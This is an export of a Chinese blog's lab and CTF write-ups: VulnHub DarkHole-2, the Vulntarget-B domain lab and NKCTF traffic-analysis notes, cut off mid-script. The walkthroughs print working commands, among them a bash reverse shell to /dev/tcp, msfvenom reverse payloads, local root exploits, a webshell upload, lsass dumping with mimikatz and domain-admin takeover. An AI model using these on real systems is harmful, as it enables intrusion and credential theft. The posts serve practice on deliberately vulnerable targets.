[{"title":"VulnHub-DarkHole-2_Write-up","path":"/2024/04/26/VulnHub-DarkHole_2-Write-up/","content":"VulnHub系列靶场-DarkHole_2复现流程~(●’◡’●) VulnHub-DarkHole_2-Write-up1.环境部署 靶机来源：靶机详情页 安装说明： 下载下来解压获得ovf后缀文件，在”VMware -&gt; 文件 -&gt; 打开“中打开ovf文件即可部署成功。 由于靶机详情页未说明该靶机的具体信息，考虑到接入现有公共网络中进行扫描存在信息混杂的情况，可以在”虚拟机 -&gt; 设置 -&gt; 网络适配器 -&gt; 高级 -&gt; MAC地址“中记录MAC地址，以便在后续打靶中更好的找到该靶机。 2.信息收集使用Kali进行信息收集，利用arp协议在众多主机中定位到靶机： 1arp-scan -l 使用Nmap进行扫描： 1nmap -sV -O 192.168.2.26 看到开了80端口，浏览器访问看看，发现一个简单的网页： 点击Login发现是通过邮箱登录，不太像是可以爆破的情景： 那就使用dirsearch进行目录扫描，看看还有没有其他什么信息： 1dirsearch -u &quot;192.168.2.26:80&quot; 发现存在.git目录，猜测存在git信息泄露漏洞。 3.开始渗透先尝试访问.git路径： 发现确实是有东西的，那么二话不说使用git-dumper把东西先弄下来： 1git-dumper http://192.168.2.26/.git/ gitbackup 进入gitbackup文件夹查看提交日志： 12cd gitbackupgit log 挨个查看提交和本地索引的差距： 123git diff 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4git diff a4d900a8d85e8938d3601f3cef113ee293028e10git diff aa2a5f3aa15bb402f2b90a07d86af57436d64917 第一个没东西，第二个发现存在账号密码： 第三个是login.php的信息： 使用刚刚发现的账号密码登录： 注意到地址栏的?id&#x3D;1，猜测存在Sql注入，使用?id&#x3D;1’测试一下发现页面空白，确实存在Sql注入： 直接使用Sql带cookie进行爆破： 1sqlmap -u &quot;http://192.168.2.26/dashboard.php?id=1&quot; --cookie PHPSESSID=di32sln9p2u0jpe1l945ql44ig --current-db 获取cookie： 爆出数据库： 爆表，有两个表，ssh和user： 1sqlmap -u &quot;http://192.168.2.26/dashboard.php?id=1&quot; --cookie PHPSESSID=di32sln9p2u0jpe1l945ql44ig -D darkhole_2 --tables 分别爆出这两个表的详细信息： 1sqlmap -u &quot;http://192.168.2.26/dashboard.php?id=1&quot; --cookie PHPSESSID=di32sln9p2u0jpe1l945ql44ig -D darkhole_2 -T users -dump 1sqlmap -u &quot;http://192.168.2.26/dashboard.php?id=1&quot; --cookie PHPSESSID=di32sln9p2u0jpe1l945ql44ig -D darkhole_2 -T ssh -dump 至此，得到了ssh的用户名和密码，以及登录网页的用户名、邮箱和密码。结合之前的信息收集，开放了22端口，可以连接ssh了： 4.提权登录到系统后，查看一下当前的权限： 发现我们只是一个低权限，那下一步或许是提权了，先对目前的系统做一个简单的信息收集： 1history 查看一下历史命令，发现本地有9999的服务，并且有计划任务： 查看一下计划任务，发现是losy执行的，那看来下一步的思路应该在losy这个用户上： 1cat /etc/crontab 再看看&#x2F;opt&#x2F;web里是个什么文件： 12cd /opt/webcat index.php 发现是一个命令执行的脚本，尝试在本地执行一下： 发现返回回来的信息是losy的，结合前面的信息，该脚本是用losy的身份来执行的，可以结合之前在历史命令中发现的密码，执行查看历史命令的操作： 1jehad@darkhole:/opt/web$ curl &quot;http://127.0.0.1:9999/?cmd=cat+~/.bash_history&quot; 就可以发现losy的密码：gang；至此可以登录losy： 照例查看一下权限： 1sudo -l 发现拥有以root权限执行python3的权限： 那思路就很清晰了：利用Python中的系统函数打开一个shell，然后该脚本使用sudo执行，那么打开的shell自然也是root的了： 1sudo python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27; 至此，拿到靶机的最高权限，看看有没有flag的踪影： 至此，靶机通关！ 5.一些关于反弹Shell的补充说明 在参考网友的打靶攻略时，发现还有反弹Shell的操作，开始跟着复现的时候没有成功，最后发现似乎不需要这一步骤也可以获取到losy的密码，毕竟在jehad用户上利用命令执行即可收集到所需信息，但在此还是复现一次反弹Shell的操作，以作记录。 反弹Shell前用到一条命令： 123ssh jehad@192.168.184.156 -L 9999:localhost:9999# -L 选项用法如下：# -L portX:hostC:portZ 或 -L *:portX:hostC:portZ 表示从任意主机发往主机 A 的端口 X 的流量，都通过主机 B，发往主机 C 的端口 Z。 结合这张图来理解： 其中SSH Client为Kali，SSH Server为靶机，结合命令来解释即是：从任意主机（当然也包括自己）发往主机A（也就是Kali）的端口9999的流量都会通过主机B（也就是靶机），发往主机C（也就是上文的localhost）；然后又因为流量都是通过主机B（靶机）发送出去的，也就是说这个”localhost“是以主机B的身份访问的，回包亦然；经过如此操作，那么就可以在Kali上访问自己的9000端口来收到收到命令执行的信息。 执行以上命令后，再开一个窗口监听反弹shell的端口，然后再开一个窗口对自身的9000端口进行访问，即使用反弹Shell的语句： 反弹shell的语句需要经过url编码一下：Url转换小工具 123http://127.0.0.1:9999/?cmd=bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.2.20/9001 0&gt;&amp;1&quot;http://127.0.0.1:9999/?cmd=bash+-c+%22bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.2.20%2f9001+0%3e%261%22 拿到Shell后继续正常渗透步骤即可： 本文结束~","tags":["靶场复现"],"categories":["靶场复现"]},{"title":"Vulntarget-B_Write-up","path":"/2024/04/24/Vulntarget-B-Write-up/","content":"Vulntarget系列靶场~第二关╰(°▽°)╯ Vulntarget-B综合靶场通关记录靶场环境如图： 1.获取外网CentOS7权限1.1 信息收集对目标主机进行全面扫描 12┌──(root㉿kali)-[~]└─# nmap -sV 192.168.1.22 可以发现目标系统为Linux，并且开放了几个Web服务，先挨个访问进行一波简单的信息收集，最后发现81端口上为极致cms的建站系统： 网上搜索一下有关这个cms的漏洞，发现后面跟admin.php可以跳转到后台登录中： 简单尝试一下弱口令，发现admin\\admin123可以直接登录： 1.2 GetShell网上搜索发现极致cms有一个后台getshell的漏洞，原理是通过系统自带的插件市场下载在线编辑插件，在页面中插入一句话木马，从而getshell： 安装好，点击配置，弹出一个账户密码配置，账户可以随便填： 登录之后发现可以直接看到网站的文件，也可以修改，我们直接在index.php中插入一句话木马： 随后用蚁剑连接即可： 进到后台打开终端收集信息，发现终端显示ret&#x3D;127： 此处用蚁剑插件绕过即可： 点击开始后，终端可用： 进行信息收集，发现由此方法进入的终端命令执行不太正常，只能带路径启动命令： 可以发现存在另外一个IP地址：10.0.20.30；那下一步的思路就很明确了，利用msf上线该主机，提权、加路由、探测内网下一跳地址。 1.3 MSF上线首先先生成一个msf的反向马，利用蚁剑传上去： 1msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.2.8 LPORT=4444 -f elf &gt; 4444.elf 进入msf进行监听： 123456msfconsoleuse exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset lhost 192.168.2.8set lport 4444run 蚁剑启动反向马： 目前还是低权限，接下来是提权，先添加路由： 1meterpreter &gt; run post/multi/manage/autoroute 1.4 CentOS7提权+内网信息收集搜索一波目标系统利用的洞： 1meterpreter &gt; run post/multi/recon/local_exploit_suggester 还不少可以用的，这里我们用第一个，先把当前会话放至后台： 1234567meterpreter &gt; bg[*] Backgrounding session 1...msf6 exploit(multi/handler) &gt; use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcpmsf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; set session 1session =&gt; 1msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; run 直接拿到root权限，更改root密码，ssh上去获取flag： 接着回到msf中，将刚刚拿到root权限的会话放至后台，开始探测内网： 1use auxiliary/scanner/portscan/tcp 扫描常用端口，发现存活10.0.20.66主机： 1.5构造MSF代理以之前拿下的Linux系统做跳板，构建代理，进而访问内网的web服务： 1use auxiliary/server/socks_proxy 2.获取Win10权限2.1 信息收集+GetShell 发现是禅道OA，尝试之前的弱密码，发现只是密码的a变成了A，直接弱密码登陆后台admin&#x2F;Admin123： 确认版本为12.4.2，搜索相关可用漏洞，发现存在CNVD-C-2020-121325的任意文件上传漏洞： 禅道OA 12.4.2 中，因为download中的downloadZipPackage函数过滤不严谨，可以使用ftp，HTTP协议绕过。 POC1：http:&#x2F;&#x2F;[目标地址]&#x2F;www&#x2F;client-download-[$version参数]-[base64加密后的恶意文件地址].html POC2：http:&#x2F;&#x2F; [目标地址] &#x2F;www&#x2F;index.php?m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;[$version参数]&amp;link&#x3D;[ base64加密后的恶意文件地址] 在之前的拿下root权限的机器中创建一个PHP木马： 目标机器有Python环境，那么我们利用这个启动一个简单的Http服务： 1[root@localhost ~]# python -m SimpleHTTPServer 8963 那么木马的链接则为： 1234HTTP://10.0.20.30:8963/shell.php# 注意：HTTP必须为大写# 通过Base64编码SFRUUDovLzEwLjAuMjAuMzA6ODk2My9zaGVsbC5waHA= 那么我们就可以构造链接了： 1http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovLzEwLjAuMjAuMzA6ODk2My9zaGVsbC5waHA= 可以看到保存成功的字样： 由漏洞详情可知道上传的shell的地址在：http://xxx.xxx.xxx.xxx/zentao/data/client/1/xxx.php 访问对应的地址，木马成功解析，接下来使用蚁剑挂代理进行连接： 识别到火绒： 2.2 免杀火绒既然有杀软那就要对上线的木马做免杀处理了，该靶场是2021年搭建的，火绒也是2021年的版本，我们随意找一个2022年的免杀工具对木马进行免杀即可，本文使用GoBypassAV，首先生成payload： 1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.20.30 lport=9999 -f raw -o winre9999.bin 随后进行免杀处理： 2.3 Win10-MSF上线更改名字后上传蚁剑： 回到msf打开监听： 12345use exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset lhost 10.0.20.30set lport 9999run 成功上线，火绒并没有把木马干掉： 拿到的是低权限，先添加路由，发现另一个网段： 1meterpreter &gt; run post/multi/manage/autoroute 2.4 Win10-提权老样子，使用msf自带的搜寻模块看看有啥洞： 1meterpreter &gt; run post/multi/recon/local_exploit_suggester 小东西问题还挺多~ 网上搜索一下各漏洞详情，决定采用cve_2020_0796_smbghost，先把会话移至后台，随后设置好攻击参数，提权成功： 1use exploit/windows/local/cve_2020_0796_smbghost 2.5 密码提取尝试获取密码，加载kiwi，没有什么有用的信息，但是看到存在域： 12load kiwicreds_all 需要获取域成员的密码，利用注册表和 procdump + mimikatz 来获取密码： 12# 修改注册表reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 修改后需要用户重新登录才生效 使用蚁剑上传procdump： 回到msf利用高权限运行procdump下载lsass文件： 1C:\\Windows\\system32&gt;C:\\inetpub\\zentao\\zentaopms\\www\\data\\client\\1\\procdump64.exe -accepteula -ma lsass.exe lsass.dmp 下载到本地： 读取密码： 1mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit 至此，域成员的密码获取成功：admin#123 3.获取域控权限3.1 票据获取+PsExec横向移动（失败）回到msf后收集域控的信息： 上传noPac工具： 1meterpreter &gt; upload /home/kali/noPac.exe 随后进shell中获取票据： 1noPac.exe -domain vulntarget.com -user win101 -pass admin#123 /dc WIN-UH20PRD3EAO.vulntarget.com /mAccount test2 /mPassword admin@123 /service cifs /ptt 列出域控目录： 添加域管账号： 12net user admin11 123K@!E /add /domainnet group &quot;Domain Admins&quot; admin11 /add /domain 修改防火墙策略并开启Win10的远程： 1234# 开放端口netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow# 开启远程REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 上传PsExec进行连接(失败)： 3.2 sam-the-admin拿下域控权限（成功）于是换一种方法，使用Python脚本挂proxychains代理执行拿到了域控System权限： 1proxychains python sam_the_admin.py &quot;vulntarget.com/win101:admin#123&quot; -dc-ip 10.0.10.100 -shell 虽然乱码，但是确实是域控权限： 域控的管理员目录下有一枚flag： 补充前面，域成员的管理员目录也有一个flag： 至此，Vulntarget-b靶场三台资产的最高权限均以拿到，文章结束~","tags":["靶场复现"],"categories":["靶场复现"]},{"title":"CTF赛题笔记","path":"/2024/03/28/CTF赛题笔记/","content":"流量分析NKCTF2024-Webshell_pro下载获取附件，解压得到一个数据包文件： 使用Wireshark打开查看，使用协议类型排序会发现响应包有内容： 随机抽一段解码发现为Base32编码： 猜测每一个响应包均有类似内容，且由题目可联想到应该是由响应包返回所需内容；于是采用脚本批量提取响应包并解码组合： 1234567891011from FlowAnalyzer import FlowAnalyzer# 一个用于流量分析的第三方库，具体用法：https://github.com/Byxs20/FlowAnalyzerimport base64# 以http为过滤规则读取数据包jsonPath = FlowAnalyzer.get_json_data(&quot;/tmp/webshell_pro.pcapng&quot;, display_filter = &quot;http&quot;)# 从HTTP请求和响应信息的字典对中遍历请求与相应，若有响应，则使用Base32解码并打印for request, response in FlowAnalyzer(jsonPath).generate_http_dict_pairs(): if response: print(base64.b32decode(response.file_data).decode()) 运行得出以下内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121┌──(kali㉿kali)-[~/桌面]└─$ python3 ctf.py root/bin/sh: 1: ipconfig: not foundeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1460 inet 172.22.161.159 netmask 255.255.240.0 broadcast 172.22.175.255 inet6 fe80::215:5dff:fe18:b845 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:15:5d:18:b8:45 txqueuelen 1000 (Ethernet) RX packets 26778 bytes 10199358 (10.1 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1240 bytes 175322 (175.3 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0Dockerbinbootdevetchomeinitliblib32lib64libx32lost+foundmediamntmysql_dataoptprocrootrunsbinsnapsrvsystmpusrvarwslOHicoGwslbmJCJFwslgCJNfEwslhaGDbDCompressedDesktopDocumentsDownloadsFLAGMusicPicturesPublicTemplatesVideosWSLhint.py小明的日记.txtcat: 小明的日记.txt: No such file or directoryRkxBRyBpcyBOT1QgSEVSRSEhISEhISEhISEhCgoKUEFTU1dPUkQ6ClBhc3N3b3JkLWJhc2VkLWVuY3J5cHRpb24KaW1wb3J0IGJhc2U2NA0KDQppbXBvcnQgbGlibnVtDQpmcm9tIENyeXB0by5QdWJsaWNLZXkgaW1wb3J0IFJTQQ0KDQpwdWJrZXkgPSAiIiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLQ0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDSy9xdjVQOGl4V2pvRkkycnpGNjJ0bTZzREZuUnNLc0doVlNDdXhRSXh1ZWhNV1FMbXY2VFB4eVRRUGVmSUt1ZnpmVUZhY2EvWUhrSVZJQzE5b2htRTVYNzM4VHR4R2JPZ2lHZWY0YnZkOXNVNk00Mms4dk1sQ1BKcDF3b0RGRE9Gb0JRcHI0WXpINFpUUjZQcytIUDhWRUlKTUc1dWlMUU9MeGRLZHhpNDFRSURBUUFCDQotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0NCiIiIg0KDQpwcmlrZXkgPSAiIiItLS0tLUJFR0lOIFBSSVZBVEUgS0VZLS0tLS0NCk1JSUNkZ0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQW1Bd2dnSmNBZ0VBQW9HQkFJcitxL2sveUxGYU9nVWphdk1YcmEyYnF3TVdkR3dxd2FGVklLN0ZBakc1NkV4WkF1YS9wTS9ISk5BOTU4Z3E1L045UVZweHI5Z2VRaFVnTFgyaUdZVGxmdmZ4TzNFWnM2Q0laNS9odTkzMnhUb3pqYVR5OHlVSThtblhDZ01VTTRXZ0ZDbXZoak1maGxOSG8rejRjL3hVUWdrd2JtNkl0QTR2RjBwM0dMalZBZ01CQUFFQ2dZQkRzcWF3VDVEQVVPSFJmdDZvWisvL2pzSk1Uck9GdTQxenRyS2tiUEFVcUNlc2grNFIxV1hBalk0d252WTFXRENCTjVDTkxMSW80UlB1bGkyUjgxSFo0T3BadWlIdjgxc05NY2NhdWhySnJpb0RkYnhoeGJNNy9qUTZNOVlhandkTmlzTDV6Q2xYQ09zMS95MDErOXZEaU1EazBrWDhoaUlZbHBQS0R3anFRUUpCQUw2WTBmdW9Kbmc1N0dHaGR3dk4yYzY1NnRMRFBqOUdSaTBzZmVlTXFhdlJUTXo2L3FlYTFMZEF1ekRoUm9TMldiOEFyaE9rWW5zMEdNYXp6YzFxNDI4Q1FRQzZzTTlPaVZSNEVWL2V3R25CbkYrMHAzYWxjWXIvL0dwMXdaNmZLSXJGSlFwYkhUemYyN0FoS2dPSjFxQjZBN1AvbVFTNkp2WURQc2dyVmtQTFJuWDdBa0VBci94cGZ5WGZCNG5zVXFXRlIzZjJVaVJteDk4UmZkbEVlUGVvOVlGek5Udlgzemt1bzlHWjhlOHFLTk1KaXdiWXpUMHlmdDU5TkdlQkxRL2V5bnFVcndKQUU2Tnh5ME1xL1k1bVZWcE1SYStiYWJlTUJZOVNIZWVCazIyUXNCRmx0Nk5UMlkzVHo0Q2VvSDU0N05FRkJKRExLSUlDTzBySjZrRjZjUVNjRVJBU2JRSkFaeTA4OHNWWTZESnRHUkxQdXlzdjNOaXlmRXZpa21jekNFa0RQZXg0c2h2RkxkZHdOVWxtaHptbDVwc2NJaWU0NG1CT0owdVgzN3krY28zcTZVb1JRZz09DQotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tDQoiIiINCg0KcHVia2V5ID0gUlNBLmltcG9ydF9rZXkocHVia2V5KQ0KcHJpa2V5ID0gUlNBLmltcG9ydF9rZXkocHJpa2V5KQ0KbiA9IHB1YmtleS5uDQoNCmRlZiBlbmNfcmVwbGFjZShiYXNlNjRfc3RyOiBzdHIpOg0KICAgIGJhc2U2NF9zdHIgPSBiYXNlNjRfc3RyLnJlcGxhY2UoIi8iLCAiZTVMZ15GTTVFUVllNSF5RiY2MiVWJFVHKkIqUmZRZU0iKQ0KICAgIGJhc2U2NF9zdHIgPSBiYXNlNjRfc3RyLnJlcGxhY2UoIisiLCAibjYmQjhHNm5FQDJ0dDRVUjZoM1FCdCo1JkMmcFZ1OFciKQ0KICAgIHJldHVybiBiYXNlNjRfc3RyLnJlcGxhY2UoIj0iLCAiSlhXVUR1TFVnd1JMS0Q5ZkQ2JlZZMmFGZUUmckBGZjIiKQ0KDQpkZWYgZW5jcnlwdChwbGFpbl90ZXh0KToNCiAgICAjIOengemSpeWKoOWvhg0KICAgIGNpcGhlcl90ZXh0ID0gYiIiDQogICAgZm9yIGkgaW4gcmFuZ2UoMCwgbGVuKHBsYWluX3RleHQpLCAxMjgpOg0KICAgICAgICBwYXJ0ID0gcGxhaW5fdGV4dFtpOmkrMTI4XQ0KICAgICAgICBlbmMgPSBsaWJudW0ubjJzKHBvdyhsaWJudW0uczJuKHBhcnQpLCBwcmlrZXkuZCwgbikpDQogICAgICAgIGNpcGhlcl90ZXh0ICs9IGVuYw0KICAgIHJldHVybiBlbmNfcmVwbGFjZShiYXNlNjQuYjY0ZW5jb2RlKGNpcGhlcl90ZXh0KS5kZWNvZGUoKSkNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBtID0gYiItUlNBLSIgKiAzMA0KICAgIHByaW50KGYi5Y6f5aeL5pWw5o2uOiB7bX0iKQ0KDQogICAgYyA9IGVuY3J5cHQobSkNCiAgICBwcmludChmIuWKoOWvhuaVsOaNrjoge2N9IikNCg==flag.txthint.py小明的日记.txtGood Luck! ByeBye~ 中间存在两段Base64编码，第一段解码得出以下内容，Flag不在这，但是附带了一个密码字段Password-based-encryption： 第二段解码出来是一个RSA的Python加密脚本： 加密脚本如下： 12345678910111213141516171819202122232425262728293031323334353637import base64import libnumfrom Crypto.PublicKey import RSApubkey = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB-----END PUBLIC KEY-----&quot;&quot;&quot;prikey = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==-----END PRIVATE KEY-----&quot;&quot;&quot;pubkey = RSA.import_key(pubkey)prikey = RSA.import_key(prikey)n = pubkey.ndef enc_replace(base64_str: str): base64_str = base64_str.replace(&quot;/&quot;, &quot;e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM&quot;) base64_str = base64_str.replace(&quot;+&quot;, &quot;n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W&quot;) return base64_str.replace(&quot;=&quot;, &quot;JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;)def encrypt(plain_text): # 私钥加密 cipher_text = b&quot;&quot; for i in range(0, len(plain_text), 128): part = plain_text[i:i+128] enc = libnum.n2s(pow(libnum.s2n(part), prikey.d, n)) cipher_text += enc return enc_replace(base64.b64encode(cipher_text).decode())if __name__ == &#x27;__main__&#x27;: m = b&quot;-RSA-&quot; * 30 print(f&quot;原始数据: &#123;m&#125;&quot;) c = encrypt(m) print(f&quot;加密数据: &#123;c&#125;&quot;) 由以上加密脚本猜测应该要补全解密脚本，丢给GPT协助生成解密脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import base64from urllib import parseimport libnumfrom Crypto.PublicKey import RSAfrom FlowAnalyzer import FlowAnalyzerpubkey = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB-----END PUBLIC KEY-----&quot;&quot;&quot;prikey = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==-----END PRIVATE KEY-----&quot;&quot;&quot;pubkey = RSA.import_key(pubkey)prikey = RSA.import_key(prikey)n = pubkey.njsonPath = FlowAnalyzer.get_json_data(&quot;/tmp/webshell_pro.pcapng&quot;, display_filter=&quot;http&quot;)def dec_replace(base64_str: str): base64_str = base64_str.replace(&quot;e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM&quot;, &quot;/&quot;) base64_str = base64_str.replace(&quot;n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W&quot;, &quot;+&quot;) return base64_str.replace(&quot;JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;, &quot;=&quot;).encode()def decrypt(cipher_text): # 公钥解密 cipher_text = base64.b64decode(dec_replace(cipher_text)) plain_text = b&quot;&quot; for i in range(0, len(cipher_text), 128): part = cipher_text[i:i+128] dec = libnum.n2s(pow(libnum.s2n(part), pubkey.e, n)) plain_text += dec return plain_text.decode()for request, response in FlowAnalyzer(jsonPath).generate_http_dict_pairs(): if request: file_data = parse.parse_qs(request.file_data)[b&#x27;shell&#x27;][0] print(decrypt(file_data.decode())) 运行得出以下内容： 123456789101112131415┌──(kali㉿kali)-[~/桌面]└─$ python3 decode.py whoamiipconfigifconfigls /ls /rootls /root/FLAGcd /root/FLAGcat 小明的日记.txtcd /root/FLAG &amp;&amp; base64 小明的日记.txtcd /root/FLAG &amp;&amp; base64 hint.pyecho U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ== &gt; /root/FLAG/flag.txtls /root/FLAGecho Good Luck! ByeBye~ 提取关键信息，Hacker将U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ==写进了&#x2F;root&#x2F;FLAG&#x2F;flag.txt文件中，这串编码看起来像Base64编码，但是尝试后不正确，结合前者的信息，应该是引入了密钥的非对称加密方法，尝试后发现为AES加密，而密钥为前面解出来的Password-based-encryption： 得到Flag：flag&#123;d0e1183c-07c3-49ea-b048-addbe6cc1b20&#125; [鹤城杯2021]流量分析下载打开附件，得到一个数据包： 使用Wireshark打开查看，简单使用协议类型排序，翻看一下可以发现这是Sql注入中布尔盲注的攻击流量： 在这回顾一下布尔盲注的知识： 布尔盲注爆出数据的原理其实是通过截取单个字符利用Ascii码来爆破字符，最后出现的Ascii码则是对应字符的Ascii码。 那根据这一性质，结合数据包中的内容，可以猜测Flag就是布尔盲注后的结果；故这有两种解法，一是根据数据包手动收集每一个字符对应的Ascii码，然后转换出来即是Flag，二则是通过脚本批量转换。 解法一：手动筛选后转换 1234a = [102,108,97,103,123,119,49,114,101,115,104,65,82,75,95,101,122,95,49,115,110,116,105,116,125,126,126]characters = [chr(i) for i in a]characters = &#x27;&#x27;.join(characters)print(characters) 即得Flag：flag&#123;w1reshARK_ez_1sntit&#125; 解法二：脚本批量筛选解析 1234567891011121314151617181920212223import re# 构建正则表达式，&#x27;\\d*&#x27;等同于&#x27;[0-9]*&#x27;。pattern = re.compile(r&quot;from%20t\\),(\\d*),1\\)\\)=(\\d*)&quot;)# 使用with来读取文件，with的好处是用完后可以自动关闭文件，减少开销。# &#x27;rb&#x27;表示用二进制只读模式读取。with open(&quot;/tmp/timu.pcapng&quot;, &quot;rb&quot;) as file: # 使用utf-8解码文件，&#x27;ignore&#x27;表示如果文件包含无法使用前者编码的字节时进行忽略，并将内容存储至data变量中。 data = 